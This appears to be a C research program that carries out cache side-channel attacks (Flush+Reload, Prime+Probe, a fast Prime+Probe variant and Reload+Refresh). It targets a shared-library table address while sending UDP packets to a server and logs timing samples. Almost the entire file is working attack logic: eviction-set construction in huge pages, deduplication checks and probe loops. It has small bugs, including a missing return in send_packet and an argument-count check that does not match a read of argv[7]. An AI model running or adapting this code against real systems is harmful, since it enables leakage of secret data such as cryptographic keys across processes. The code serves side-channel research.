#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <poll.h>
#include <time.h>

#include "T.h"           /*Shared library*/
#include "cache_utils.h" /*Cache manipulation functions*/

/*For huge pages*/
#define FILE_NAME "/mnt/hugetlbfs/filehuge"
#define PROTECTION (PROT_READ | PROT_WRITE)
/* Only ia64 requires this */
#ifdef __ia64__
#define ADDR (void *)(0x8000000000000000UL)
#define FLAGS (MAP_SHARED | MAP_FIXED)
#else
#define ADDR (void *)(0x0UL)
#define FLAGS (MAP_SHARED)
#endif

#define TIME_LIMIT 190         /*Time for main memory access, must be calibrated*/
#define CLEAN_REFRESH_TIME 550 /*Time for refresh, must be calibrated*/
#define TIME_PRIME 650         /*Time for prime, must be calibrated*/
#define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
#define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE

#define CLEAN_NOISE 1
#define WAIT_FIXED 1

/*Values for this approach*/
#define NUM_SAMPLES 100000
#define THRESHOLD 20000
#define PACKET_SIZE 24

int target_pos; //Should be the same in the sender
long int *base_address;
long int *target_address;
long int candidates_set[NUM_CANDIDATES];
long int filtered_set[NUM_CANDIDATES];
long int eviction_set[CACHE_SET_SIZE * CACHE_SLICES];
long int invariant_part[CACHE_SET_SIZE * CACHE_SLICES];
long int elements_set[CACHE_SET_SIZE];          // For R+R attacks
long int long_eviction_set[CACHE_SET_SIZE * 2]; // For fast P+P attacks

int fd;
FILE *out_fd;
uintptr_t phys_addr;
int slice, set;
int S, C, D;

char packet[PACKET_SIZE * 2];
char response[PACKET_SIZE];
struct sockaddr_in server;
int s;
int num_samples;

int send_packet(char packet[PACKET_SIZE])
{
    /*Generates random packet,flushes data, sends request, reloads data when response is received*/
    int i;
    struct pollfd p;

    send(s, packet, PACKET_SIZE, 0);
    p.fd = s;
    p.events = POLLIN;
    if (poll(&p, 1, 10) <= 0)
        return;
    while (p.revents & POLLIN)
    {
        if (recv(s, response, sizeof response, 0) == sizeof response)
        {
            if (!memcmp(packet, response, PACKET_SIZE - sizeof(uint64_t)))
            {
                return 1;
            }
            return 0;
        }
        if (poll(&p, 1, 0) <= 0)
            break;
    }
}

void check_dedup(long int *target_address)
{
    int i, t, res;
    int cont = 0;
    while (cont < 20)
    {
        //Random packet to send
        for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
            packet[i] = random();
        *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
        t = access_timed_flush(target_address);
        res = send_packet(packet);
        lfence(); //Ensure the time is not read in advance
        if (res > 0)
        {
            t = access_timed_flush(target_address);
            if (t < TIME_LIMIT)
            {
                cont++;
            }
        }
    }
}

int main(int argc, char **argv)
{
    int i;
    char file_name[40];
    //Just use first argument
    if (argc < 5)
    {
        printf("Expected IP, target address (int), attack name (-fr,-pp,-fpp,-rr) and number of samples\n");
        return -1;
    }

    if (!inet_aton(argv[1], &server.sin_addr))
        return -1;
    server.sin_family = AF_INET;
    server.sin_port = htons(10000);

    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        sleep(1);
    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1)
        sleep(1);

    target_pos = atoi(argv[2]);
    num_samples = atoi(argv[4]);

    if (!target_pos)
    {
        printf("Error with the target address \n");
        return -1;
    }
    target_address = (long int *)get_address_table(target_pos);
    //target_address = (long int *)get_address_quixote(target_pos);
    printf("Target address %lx \n", (long int)target_address);

    if (strcmp(argv[3], "-fr") == 0)
    {
        printf("TEST FLUSH+RELOAD\n");
        snprintf(file_name, 40, "test_fr_%d_sync.txt", target_pos);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        printf("Saving results to %s\n", file_name);
        int t;
        unsigned long tim = timestamp();
        int cont = 0;
        /*Check deduplication*/
        check_dedup(target_address);
        printf("Ready \n");
        int j = 0;
        /*Carry the attack*/
        while (j < num_samples)
        {
            //Random packet to send
            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
                packet[i] = random();
            uint64_t ale = (uint64_t)(rand() % THRESHOLD);
            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = ale;
            t = access_timed_flush(target_address);

            if (send_packet(packet) > 0)
            {
                t = access_timed_flush(target_address);
                tim = timestamp();
                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
                j++;
            }
        }
        fclose(out_fd);
        return 0;
    }
    else if (!strcmp(argv[3], "-pp"))
    {
        printf("TEST PRIME+PROBE\n");
        /*Reserve huge pages*/
        /*Allocate memory using hugepages*/
        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }
        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }
        long int mem;
        for (mem = 0; mem < ((reserved_size) / 8); ++mem)
        {
            *(base_address + mem) = mem;
        }

        printf("Reserved hugepages at %lx \n", (long int)base_address);

        /*Output file*/
        snprintf(file_name, 40, "test_pp_%d_sync.txt", target_pos);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        printf("Saving results to %s\n", file_name);

        /*Set generation*/
        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);

        /*Check deduplication*/
        check_dedup(target_address);
        printf("Ready \n");
        int j = 0;
        unsigned long tim = timestamp();
        int t;

        profile_address(invariant_part, eviction_set, target_address, &set, &slice); //Tricky
        printf("Set and Slice %i %i \n", set, slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];

        /*Carry the attack*/
        while (j < num_samples)
        {
            //Random packet to send
            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
                packet[i] = random();
            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
            t = probe_one_set(prime_address);
            mfence();

            if (send_packet(packet) > 0)
            {
                lfence();
                t = probe_one_set(prime_address);
                tim = timestamp();
                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
                j++;
            }
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else if (!strcmp(argv[3], "-fpp")) //For fast Prime+Probe test
    {
        if (argc < 7)
        {
            printf("Also expected S,C and D for fast Prime+Probe\n");
            return -1;
        }
        S = atoi(argv[5]);
        C = atoi(argv[6]);
        D = atoi(argv[7]);
        printf("TEST FAST PRIME+PROBE (Rowhammer.js)\n");
        snprintf(file_name, 40, "test_fpp_%d_sync.txt", target_pos);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        printf("Saving results to %s\n", file_name);
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }
        long int mem;
        for (mem = 0; mem < ((reserved_size) / 8); ++mem)
        {
            *(base_address + mem) = mem;
        }

        /*Set generation*/
        int tar_set = 25 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);

        /*Check deduplication*/
        check_dedup(target_address);
        printf("Ready \n");
        int j = 0;
        int t;
        unsigned long tim = timestamp();

        profile_address(invariant_part, eviction_set, target_address, &set, &slice); //Trick
        printf("Set and Slice %i %i \n", set, slice);

        /*Create the eviction set that matches with the target*/
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, set); //To increase the size of the eviction set
        generate_new_eviction_set(set, invariant_part, eviction_set);
        increase_eviction(candidates_set, NUM_CANDIDATES, eviction_set, long_eviction_set, slice, TIME_LIMIT); //Specific for this variant

        /*Carry the attack*/
        while (j < num_samples)
        {
            //Random packet to send
            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
                packet[i] = random();
            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
            t = fast_prime(long_eviction_set, S, C, D);
            mfence();

            if (send_packet(packet) > 0)
            {
                lfence();
                t = fast_prime(long_eviction_set, S, C, D);
                tim = timestamp();
                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
                j++;
            }
        }

        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else if (!strcmp(argv[3], "-rr"))
    {
        printf("TEST RELOAD+REFRESH\n");
        snprintf(file_name, 40, "test_rr_%d_sync.txt", target_pos);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        printf("Saving results to %s\n", file_name);
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        long int mem;
        for (mem = 0; mem < ((reserved_size) / 8); ++mem)
        {
            *(base_address + mem) = mem;
        }

        /*Set generation*/
        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);

        /*Check deduplication*/
        check_dedup(target_address);
        printf("Ready \n");
        int j = 0;
        int t, t1;
        unsigned long tim = timestamp();

        profile_address(invariant_part, eviction_set, target_address, &set, &slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        get_elements_set_rr(elements_set, eviction_set, target_address, slice); // For R+R
        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *first_el = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *conflict_address = (long int *)eviction_set[(slice + 1) * CACHE_SET_SIZE - 1];
        printf("Set and Slice %i %i \n", set, slice);

        /*Set affinity to current core to avoid variations*/
        /*int core = sched_getcpu();
        if (core < 0)
        {
            printf("Error getting the CPU \n");
            return -1;
        }
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(core, &mask);
        printf("Core %i \n",core);
        sched_setaffinity(0, sizeof(cpu_set_t), &mask);

        while (sched_getcpu() != core);*/

        /*Prepare the sets for the attack*/
        prepare_sets(elements_set, conflict_address, TIME_PRIME);

        /*Carry the attack*/
        int control = 0;
        t1 = 0; // Refresh
        while (j < num_samples)
        {
            //Random packet to send
            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
                packet[i] = random();
            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
#if CLEAN_NOISE
            if (t1 > CLEAN_REFRESH_TIME)
            {
                prepare_sets(elements_set, conflict_address, TIME_PRIME);
            }
#endif
            mfence();
            int res = send_packet(packet);
            lfence();
            t = reload_step(target_address, conflict_address, first_el);
            lfence();
            t1 = refresh_step((long int*)elements_set[2]);
            tim = timestamp();
            if (res > 0)
            {
                fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
                j++;
            }
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else
    {
        printf("wrong argument \n");
        return -1;
    }
}
